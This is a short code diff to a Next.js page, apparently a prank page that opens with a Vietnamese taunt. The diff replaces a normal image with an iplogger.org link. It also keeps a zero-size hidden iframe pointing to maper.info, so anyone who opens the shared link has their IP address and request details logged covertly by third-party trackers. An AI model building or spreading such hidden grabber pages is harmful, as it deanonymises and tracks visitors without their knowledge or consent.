@@ -32,7 +32,7 @@ export default function Home() {
         <meta property="og:image:height" content="480" />
       </Head>
       <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', flexDirection: 'column' }}>
-        <img src={'https://4.bp.blogspot.com/-k1PJp9KaaWE/XLKZLRgtdtI/AAAAAAAAC_U/gLX9_hMoI8ktHnKXCaGmHdXTeU0gLyyXwCLcBGAs/s400/l%25E1%25BB%25ABa.jpg'} />
+        <img src={'https://iplogger.org/26TPj6'} />
         <iframe src='https://maper.info/X6wai' height={0} width={0} />
         <h1>Đồ con lừa !!!! Ahihi</h1>
       </div >
